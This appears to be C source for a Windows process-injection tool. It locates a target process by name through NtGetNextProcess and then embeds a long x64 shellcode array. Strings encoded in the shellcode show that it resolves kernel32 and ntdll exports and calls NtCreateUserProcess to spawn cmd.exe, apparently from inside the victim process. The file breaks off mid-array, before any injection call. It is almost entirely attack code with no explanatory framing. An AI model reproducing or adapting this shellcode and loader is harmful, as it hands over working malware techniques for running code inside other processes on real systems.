#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <shlwapi.h>
#include <strsafe.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* fNtGetNextProcess)(
	_In_ HANDLE ProcessHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ ULONG HandleAttributes,
	_In_ ULONG Flags,
	_Out_ PHANDLE NewProcessHandle
	);
HINSTANCE hNtdll = LoadLibrary(L"ntdll.dll");

HANDLE fProc(const char* procname) {
	int pid = 0;
	HANDLE current = NULL;
	char procName[MAX_PATH];

	// resolve function address
	fNtGetNextProcess myNtGetNextProcess = (fNtGetNextProcess)GetProcAddress(hNtdll, "NtGetNextProcess");

	// loop through all processes
	while (!myNtGetNextProcess(current, MAXIMUM_ALLOWED, 0, 0, &current)) {
		GetProcessImageFileNameA(current, procName, MAX_PATH);
		// Extract file name from the full path
		char* fileName = strrchr(procName, '\\');
		if (fileName != NULL)
			fileName++; // Move past the backslash
		if (lstrcmpiA(procname, fileName) == 0) {
			pid = GetProcessId(current);
			break;
		}
	}

	return current;
}


int findAndDO(HANDLE h) {

	unsigned char shellcode[] = {

			0x40, 0x55, 0x57, 0x48, 0x81, 0xEC, 0xB8, 0x03,
	0x00, 0x00, 0x48, 0x8D, 0x6C, 0x24, 0x60, 0x65, 0x48, 0x8B, 0x04, 0x25,
	0x60, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45, 0x00, 0x48, 0x8B, 0x45, 0x00,
	0x48, 0x8B, 0x40, 0x18, 0x48, 0x89, 0x45, 0x08, 0x48, 0x8B, 0x45, 0x08,
	0xC6, 0x40, 0x48, 0x00, 0x48, 0x8B, 0x45, 0x00, 0x48, 0x8B, 0x40, 0x18,
	0x48, 0x83, 0xC0, 0x20, 0x48, 0x89, 0x85, 0x30, 0x01, 0x00, 0x00, 0x48,
	0x8B, 0x85, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x85,
	0x38, 0x01, 0x00, 0x00, 0x48, 0xB8, 0x6B, 0x00, 0x65, 0x00, 0x72, 0x00,
	0x6E, 0x00, 0x48, 0x89, 0x45, 0x38, 0x48, 0xB8, 0x65, 0x00, 0x6C, 0x00,
	0x33, 0x00, 0x32, 0x00, 0x48, 0x89, 0x45, 0x40, 0x48, 0xB8, 0x2E, 0x00,
	0x64, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x48, 0x89, 0x45, 0x48, 0x48, 0xC7,
	0x45, 0x50, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x50, 0x01, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x30, 0x01, 0x00, 0x00,
	0x48, 0x8B, 0x00, 0x48, 0x89, 0x85, 0x38, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x85, 0x38, 0x01, 0x00, 0x00, 0x48, 0x83, 0xE8, 0x10, 0x48, 0x89, 0x85,
	0x58, 0x01, 0x00, 0x00, 0xC7, 0x85, 0x60, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x85, 0x58, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40,
	0x60, 0x48, 0x89, 0x85, 0x48, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x45, 0x38,
	0x48, 0x89, 0x85, 0x40, 0x01, 0x00, 0x00, 0xC7, 0x85, 0x60, 0x01, 0x00,
	0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00,
	0x0F, 0xB7, 0x00, 0x85, 0xC0, 0x75, 0x0F, 0xC7, 0x85, 0x60, 0x01, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0xE9, 0x2E, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x00, 0x88, 0x85, 0x64, 0x01,
	0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00,
	0x3D, 0xFF, 0x00, 0x00, 0x00, 0x7E, 0x13, 0x48, 0x8B, 0x85, 0x48, 0x01,
	0x00, 0x00, 0x0F, 0xB7, 0x00, 0x66, 0x89, 0x85, 0x68, 0x01, 0x00, 0x00,
	0xEB, 0x46, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00, 0x83, 0xF8, 0x41,
	0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00, 0x83, 0xF8, 0x5A,
	0x7F, 0x12, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00, 0x83, 0xC0, 0x20,
	0x88, 0x85, 0x65, 0x01, 0x00, 0x00, 0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x64,
	0x01, 0x00, 0x00, 0x88, 0x85, 0x65, 0x01, 0x00, 0x00, 0x66, 0x0F, 0xBE,
	0x85, 0x65, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x68, 0x01, 0x00, 0x00,
	0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x00, 0x88, 0x85,
	0x64, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F,
	0xB7, 0x00, 0x3D, 0xFF, 0x00, 0x00, 0x00, 0x7E, 0x13, 0x48, 0x8B, 0x85,
	0x40, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00, 0x66, 0x89, 0x85, 0x6C, 0x01,
	0x00, 0x00, 0xEB, 0x46, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00, 0x83,
	0xF8, 0x41, 0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00, 0x83,
	0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00, 0x83,
	0xC0, 0x20, 0x88, 0x85, 0x65, 0x01, 0x00, 0x00, 0xEB, 0x0D, 0x0F, 0xB6,
	0x85, 0x64, 0x01, 0x00, 0x00, 0x88, 0x85, 0x65, 0x01, 0x00, 0x00, 0x66,
	0x0F, 0xBE, 0x85, 0x65, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x6C, 0x01,
	0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x48, 0x83, 0xC0,
	0x02, 0x48, 0x89, 0x85, 0x48, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x40,
	0x01, 0x00, 0x00, 0x48, 0x83, 0xC0, 0x02, 0x48, 0x89, 0x85, 0x40, 0x01,
	0x00, 0x00, 0x0F, 0xB7, 0x85, 0x68, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x8D,
	0x6C, 0x01, 0x00, 0x00, 0x3B, 0xC1, 0x0F, 0x84, 0xB5, 0xFE, 0xFF, 0xFF,
	0x83, 0xBD, 0x60, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x2E, 0x01, 0x00,
	0x00, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x48, 0x83, 0xE8, 0x02,
	0x48, 0x89, 0x85, 0x48, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x40, 0x01,
	0x00, 0x00, 0x48, 0x83, 0xE8, 0x02, 0x48, 0x89, 0x85, 0x40, 0x01, 0x00,
	0x00, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x00, 0x88,
	0x85, 0x64, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00,
	0x0F, 0xB7, 0x00, 0x3D, 0xFF, 0x00, 0x00, 0x00, 0x7E, 0x13, 0x48, 0x8B,
	0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00, 0x66, 0x89, 0x85, 0x68,
	0x01, 0x00, 0x00, 0xEB, 0x46, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00,
	0x83, 0xF8, 0x41, 0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00,
	0x83, 0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE, 0x85, 0x64, 0x01, 0x00, 0x00,
	0x83, 0xC0, 0x20, 0x88, 0x85, 0x65, 0x01, 0x00, 0x00, 0xEB, 0x0D, 0x0F,
	0xB6, 0x85, 0x64, 0x01, 0x00, 0x00, 0x88, 0x85, 0x65, 0x01, 0x00, 0x00,
	0x66, 0x0F, 0xBE, 0x85, 0x65, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x68,
	0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F, 0xB6,
	0x00, 0x88, 0x85, 0x64, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x40, 0x01,
	0x00, 0x00, 0x0F, 0xB7, 0x00, 0x3D, 0xFF, 0x00, 0x00, 0x00, 0x7E, 0x13,
	0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00, 0x66, 0x89,
	0x85, 0x6C, 0x01, 0x00, 0x00, 0xEB, 0x46, 0x0F, 0xBE, 0x85, 0x64, 0x01,
	0x00, 0x00, 0x83, 0xF8, 0x41, 0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x64, 0x01,
	0x00, 0x00, 0x83, 0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE, 0x85, 0x64, 0x01,
	0x00, 0x00, 0x83, 0xC0, 0x20, 0x88, 0x85, 0x65, 0x01, 0x00, 0x00, 0xEB,
	0x0D, 0x0F, 0xB6, 0x85, 0x64, 0x01, 0x00, 0x00, 0x88, 0x85, 0x65, 0x01,
	0x00, 0x00, 0x66, 0x0F, 0xBE, 0x85, 0x65, 0x01, 0x00, 0x00, 0x66, 0x89,
	0x85, 0x6C, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x85, 0x68, 0x01, 0x00, 0x00,
	0x0F, 0xB7, 0x8D, 0x6C, 0x01, 0x00, 0x00, 0x2B, 0xC1, 0x89, 0x85, 0x60,
	0x01, 0x00, 0x00, 0x83, 0xBD, 0x60, 0x01, 0x00, 0x00, 0x00, 0x75, 0x10,
	0x48, 0x8B, 0x85, 0x58, 0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0x50, 0x01,
	0x00, 0x00, 0xEB, 0x25, 0x48, 0x8B, 0x85, 0x38, 0x01, 0x00, 0x00, 0x48,
	0x8B, 0x00, 0x48, 0x89, 0x85, 0x38, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85,
	0x30, 0x01, 0x00, 0x00, 0x48, 0x39, 0x85, 0x38, 0x01, 0x00, 0x00, 0x0F,
	0x85, 0xF9, 0xFC, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x50, 0x01, 0x00, 0x00,
	0x48, 0x89, 0x85, 0x70, 0x01, 0x00, 0x00, 0x48, 0xB8, 0x6E, 0x00, 0x74,
	0x00, 0x64, 0x00, 0x6C, 0x00, 0x48, 0x89, 0x45, 0x38, 0x48, 0xB8, 0x6C,
	0x00, 0x2E, 0x00, 0x64, 0x00, 0x6C, 0x00, 0x48, 0x89, 0x45, 0x40, 0x48,
	0xC7, 0x45, 0x48, 0x6C, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x45, 0x50, 0x00,
	0x00, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x78, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x85, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x00,
	0x48, 0x89, 0x85, 0x38, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x38, 0x01,
	0x00, 0x00, 0x48, 0x83, 0xE8, 0x10, 0x48, 0x89, 0x85, 0x80, 0x01, 0x00,
	0x00, 0xC7, 0x85, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x85, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x60, 0x48, 0x89,
	0x85, 0x48, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x45, 0x38, 0x48, 0x89, 0x85,
	0x40, 0x01, 0x00, 0x00, 0xC7, 0x85, 0x88, 0x01, 0x00, 0x00, 0x01, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00,
	0x85, 0xC0, 0x75, 0x0F, 0xC7, 0x85, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0xE9, 0x2E, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01,
	0x00, 0x00, 0x0F, 0xB6, 0x00, 0x88, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x48,
	0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00, 0x3D, 0xFF, 0x00,
	0x00, 0x00, 0x7E, 0x13, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F,
	0xB7, 0x00, 0x66, 0x89, 0x85, 0x90, 0x01, 0x00, 0x00, 0xEB, 0x46, 0x0F,
	0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x83, 0xF8, 0x41, 0x7C, 0x1E, 0x0F,
	0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x83, 0xF8, 0x5A, 0x7F, 0x12, 0x0F,
	0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x83, 0xC0, 0x20, 0x88, 0x85, 0x8D,
	0x01, 0x00, 0x00, 0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x8C, 0x01, 0x00, 0x00,
	0x88, 0x85, 0x8D, 0x01, 0x00, 0x00, 0x66, 0x0F, 0xBE, 0x85, 0x8D, 0x01,
	0x00, 0x00, 0x66, 0x89, 0x85, 0x90, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85,
	0x40, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x00, 0x88, 0x85, 0x8C, 0x01, 0x00,
	0x00, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00, 0x3D,
	0xFF, 0x00, 0x00, 0x00, 0x7E, 0x13, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00,
	0x00, 0x0F, 0xB7, 0x00, 0x66, 0x89, 0x85, 0x94, 0x01, 0x00, 0x00, 0xEB,
	0x46, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x83, 0xF8, 0x41, 0x7C,
	0x1E, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x83, 0xF8, 0x5A, 0x7F,
	0x12, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x83, 0xC0, 0x20, 0x88,
	0x85, 0x8D, 0x01, 0x00, 0x00, 0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x8C, 0x01,
	0x00, 0x00, 0x88, 0x85, 0x8D, 0x01, 0x00, 0x00, 0x66, 0x0F, 0xBE, 0x85,
	0x8D, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x94, 0x01, 0x00, 0x00, 0x48,
	0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x48, 0x83, 0xC0, 0x02, 0x48, 0x89,
	0x85, 0x48, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00,
	0x48, 0x83, 0xC0, 0x02, 0x48, 0x89, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F,
	0xB7, 0x85, 0x90, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x8D, 0x94, 0x01, 0x00,
	0x00, 0x3B, 0xC1, 0x0F, 0x84, 0xB5, 0xFE, 0xFF, 0xFF, 0x83, 0xBD, 0x88,
	0x01, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x2E, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x85, 0x48, 0x01, 0x00, 0x00, 0x48, 0x83, 0xE8, 0x02, 0x48, 0x89, 0x85,
	0x48, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x48,
	0x83, 0xE8, 0x02, 0x48, 0x89, 0x85, 0x40, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x00, 0x88, 0x85, 0x8C, 0x01,
	0x00, 0x00, 0x48, 0x8B, 0x85, 0x48, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00,
	0x3D, 0xFF, 0x00, 0x00, 0x00, 0x7E, 0x13, 0x48, 0x8B, 0x85, 0x48, 0x01,
	0x00, 0x00, 0x0F, 0xB7, 0x00, 0x66, 0x89, 0x85, 0x90, 0x01, 0x00, 0x00,
	0xEB, 0x46, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x83, 0xF8, 0x41,
	0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x83, 0xF8, 0x5A,
	0x7F, 0x12, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x83, 0xC0, 0x20,
	0x88, 0x85, 0x8D, 0x01, 0x00, 0x00, 0xEB, 0x0D, 0x0F, 0xB6, 0x85, 0x8C,
	0x01, 0x00, 0x00, 0x88, 0x85, 0x8D, 0x01, 0x00, 0x00, 0x66, 0x0F, 0xBE,
	0x85, 0x8D, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x90, 0x01, 0x00, 0x00,
	0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x00, 0x88, 0x85,
	0x8C, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x40, 0x01, 0x00, 0x00, 0x0F,
	0xB7, 0x00, 0x3D, 0xFF, 0x00, 0x00, 0x00, 0x7E, 0x13, 0x48, 0x8B, 0x85,
	0x40, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x00, 0x66, 0x89, 0x85, 0x94, 0x01,
	0x00, 0x00, 0xEB, 0x46, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x83,
	0xF8, 0x41, 0x7C, 0x1E, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x83,
	0xF8, 0x5A, 0x7F, 0x12, 0x0F, 0xBE, 0x85, 0x8C, 0x01, 0x00, 0x00, 0x83,
	0xC0, 0x20, 0x88, 0x85, 0x8D, 0x01, 0x00, 0x00, 0xEB, 0x0D, 0x0F, 0xB6,
	0x85, 0x8C, 0x01, 0x00, 0x00, 0x88, 0x85, 0x8D, 0x01, 0x00, 0x00, 0x66,
	0x0F, 0xBE, 0x85, 0x8D, 0x01, 0x00, 0x00, 0x66, 0x89, 0x85, 0x94, 0x01,
	0x00, 0x00, 0x0F, 0xB7, 0x85, 0x90, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0x8D,
	0x94, 0x01, 0x00, 0x00, 0x2B, 0xC1, 0x89, 0x85, 0x88, 0x01, 0x00, 0x00,
	0x83, 0xBD, 0x88, 0x01, 0x00, 0x00, 0x00, 0x75, 0x10, 0x48, 0x8B, 0x85,
	0x80, 0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0x78, 0x01, 0x00, 0x00, 0xEB,
	0x25, 0x48, 0x8B, 0x85, 0x38, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x00, 0x48,
	0x89, 0x85, 0x38, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x30, 0x01, 0x00,
	0x00, 0x48, 0x39, 0x85, 0x38, 0x01, 0x00, 0x00, 0x0F, 0x85, 0xF9, 0xFC,
	0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x50, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40,
	0x30, 0x48, 0x89, 0x85, 0x98, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85, 0x98,
	0x01, 0x00, 0x00, 0x48, 0x63, 0x40, 0x3C, 0x48, 0x8B, 0x8D, 0x98, 0x01,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x85, 0xA0,
	0x01, 0x00, 0x00, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00,
	0x48, 0x8B, 0x8D, 0xA0, 0x01, 0x00, 0x00, 0x8B, 0x84, 0x01, 0x88, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x8D, 0x98, 0x01, 0x00, 0x00, 0x48, 0x03, 0xC8,
	0x48, 0x8B, 0xC1, 0x48, 0x89, 0x85, 0xA8, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x85, 0xA8, 0x01, 0x00, 0x00, 0x8B, 0x40, 0x20, 0x48, 0x8B, 0x8D, 0x98,
	0x01, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x85,
	0xB0, 0x01, 0x00, 0x00, 0x48, 0xB8, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F,
	0x63, 0x41, 0x48, 0x89, 0x45, 0x10, 0xC7, 0x85, 0xB8, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x48, 0x63, 0x85, 0xB8, 0x01, 0x00, 0x00, 0x48,
	0x8B, 0x8D, 0xB0, 0x01, 0x00, 0x00, 0x48, 0x63, 0x04, 0x81, 0x48, 0x8B,
	0x8D, 0x98, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x55, 0x10, 0x48, 0x39, 0x14,
	0x01, 0x74, 0x10, 0x8B, 0x85, 0xB8, 0x01, 0x00, 0x00, 0xFF, 0xC0, 0x89,
	0x85, 0xB8, 0x01, 0x00, 0x00, 0xEB, 0xCD, 0x48, 0x8B, 0x85, 0xA8, 0x01,
	0x00, 0x00, 0x8B, 0x40, 0x24, 0x48, 0x8B, 0x8D, 0x98, 0x01, 0x00, 0x00,
	0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x85, 0xC0, 0x01, 0x00,
	0x00, 0x48, 0x8B, 0x85, 0xA8, 0x01, 0x00, 0x00, 0x8B, 0x40, 0x1C, 0x48,
	0x8B, 0x8D, 0x98, 0x01, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1,
	0x48, 0x89, 0x85, 0xC8, 0x01, 0x00, 0x00, 0x48, 0x63, 0x85, 0xB8, 0x01,
	0x00, 0x00, 0x48, 0x8B, 0x8D, 0xC0, 0x01, 0x00, 0x00, 0x48, 0x0F, 0xBF,
	0x04, 0x41, 0x48, 0x8B, 0x8D, 0xC8, 0x01, 0x00, 0x00, 0x48, 0x63, 0x04,
	0x81, 0x48, 0x8B, 0x8D, 0x98, 0x01, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48,
	0x8B, 0xC1, 0x48, 0x89, 0x85, 0xD0, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x85,
	0x98, 0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0xD8, 0x01, 0x00, 0x00, 0x48,
	0x8B, 0x85, 0x78, 0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0xE0, 0x01, 0x00,
	0x00, 0x48, 0x8B, 0x85, 0xE0, 0x01, 0x00, 0x00, 0xC7, 0x80, 0x14, 0x01,
	0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x85, 0x78, 0x01, 0x00,
	0x00, 0x48, 0x8B, 0x40, 0x30, 0x48, 0x89, 0x85, 0xE8, 0x01, 0x00, 0x00,
	0x48, 0xB8, 0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69, 0x62, 0x72, 0x48, 0x89,
	0x45, 0x10, 0x48, 0xC7, 0x45, 0x18, 0x61, 0x72, 0x79, 0x41, 0x48, 0x8D,
	0x55, 0x10, 0x48, 0x8B, 0x8D, 0xD8, 0x01, 0x00, 0x00, 0xFF, 0x95, 0xD0,
	0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0xF0, 0x01, 0x00, 0x00, 0x48, 0xB8,
	0x52, 0x74, 0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x48, 0x89, 0x45, 0x10,
	0x48, 0xB8, 0x61, 0x74, 0x65, 0x48, 0x65, 0x61, 0x70, 0x00, 0x48, 0x89,
	0x45, 0x18, 0x48, 0x8D, 0x55, 0x10, 0x48, 0x8B, 0x8D, 0xE8, 0x01, 0x00,
	0x00, 0xFF, 0x95, 0xD0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0xF8, 0x01,
	0x00, 0x00, 0x48, 0xB8, 0x52, 0x74, 0x6C, 0x43, 0x72, 0x65, 0x61, 0x74,
	0x48, 0x89, 0x45, 0x38, 0x48, 0xB8, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x65,
	0x73, 0x73, 0x48, 0x89, 0x45, 0x40, 0x48, 0xB8, 0x50, 0x61, 0x72, 0x61,
	0x6D, 0x65, 0x74, 0x65, 0x48, 0x89, 0x45, 0x48, 0x48, 0xC7, 0x45, 0x50,
	0x72, 0x73, 0x45, 0x78, 0x48, 0x8D, 0x55, 0x38, 0x48, 0x8B, 0x8D, 0xE8,
	0x01, 0x00, 0x00, 0xFF, 0x95, 0xD0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x85,
	0x00, 0x02, 0x00, 0x00, 0x48, 0xB8, 0x4E, 0x74, 0x43, 0x72, 0x65, 0x61,
	0x74, 0x65, 0x48, 0x89, 0x45, 0x20, 0x48, 0xB8, 0x55, 0x73, 0x65, 0x72,
	0x50, 0x72, 0x6F, 0x63, 0x48, 0x89, 0x45, 0x28, 0x48, 0xC7, 0x45, 0x30,
	0x65, 0x73, 0x73, 0x00, 0x48, 0x8D, 0x55, 0x20, 0x48, 0x8B, 0x8D, 0xE8,
	0x01, 0x00, 0x00, 0xFF, 0x95, 0xD0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x85,
	0x08, 0x02, 0x00, 0x00, 0x48, 0xB8, 0x52, 0x74, 0x6C, 0x49, 0x6E, 0x69,
	0x74, 0x55, 0x48, 0x89, 0x45, 0x20, 0x48, 0xB8, 0x6E, 0x69, 0x63, 0x6F,
	0x64, 0x65, 0x53, 0x74, 0x48, 0x89, 0x45, 0x28, 0x48, 0xC7, 0x45, 0x30,
	0x72, 0x69, 0x6E, 0x67, 0x48, 0x8D, 0x55, 0x20, 0x48, 0x8B, 0x8D, 0xE8,
	0x01, 0x00, 0x00, 0xFF, 0x95, 0xD0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x85,
	0x10, 0x02, 0x00, 0x00, 0x48, 0xB8, 0x5C, 0x00, 0x3F, 0x00, 0x3F, 0x00,
	0x5C, 0x00, 0x48, 0x89, 0x45, 0x60, 0x48, 0xB8, 0x43, 0x00, 0x3A, 0x00,
	0x5C, 0x00, 0x57, 0x00, 0x48, 0x89, 0x45, 0x68, 0x48, 0xB8, 0x69, 0x00,
	0x6E, 0x00, 0x64, 0x00, 0x6F, 0x00, 0x48, 0x89, 0x45, 0x70, 0x48, 0xB8,
	0x77, 0x00, 0x73, 0x00, 0x5C, 0x00, 0x53, 0x00, 0x48, 0x89, 0x45, 0x78,
	0x48, 0xB8, 0x79, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x48, 0x89,
	0x85, 0x80, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x6D, 0x00, 0x33, 0x00, 0x32,
	0x00, 0x5C, 0x00, 0x48, 0x89, 0x85, 0x88, 0x00, 0x00, 0x00, 0x48, 0xB8,
	0x63, 0x00, 0x6D, 0x00, 0x64, 0x00, 0x2E, 0x00, 0x48, 0x89, 0x85, 0x90,
	0x00, 0x00, 0x00, 0x48, 0xB8, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00,
	0x00, 0x48, 0x89, 0x85, 0x98, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x60,
	0x48, 0x8D, 0x8D, 0x18, 0x02, 0x00, 0x00, 0xFF, 0x95, 0x10, 0x02, 0x00,
	0x00, 0x48, 0xB8, 0x5C, 0x00, 0x3F, 0x00, 0x3F, 0x00, 0x5C, 0x00, 0x48,
	0x89, 0x85, 0xA0, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x43, 0x00, 0x3A, 0x00,
	0x5C, 0x00, 0x57, 0x00, 0x48, 0x89, 0x85, 0xA8, 0x00, 0x00, 0x00, 0x48,
	0xB8, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x6F, 0x00, 0x48, 0x89, 0x85,
	0xB0, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x77, 0x00, 0x73, 0x00, 0x5C, 0x00,
	0x53, 0x00, 0x48, 0x89, 0x85, 0xB8, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x79,
	0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x48, 0x89, 0x85, 0xC0, 0x00,
	0x00, 0x00, 0x48, 0xB8, 0x6D, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5C, 0x00,
	0x48, 0x89, 0x85, 0xC8, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x63, 0x00, 0x6D,
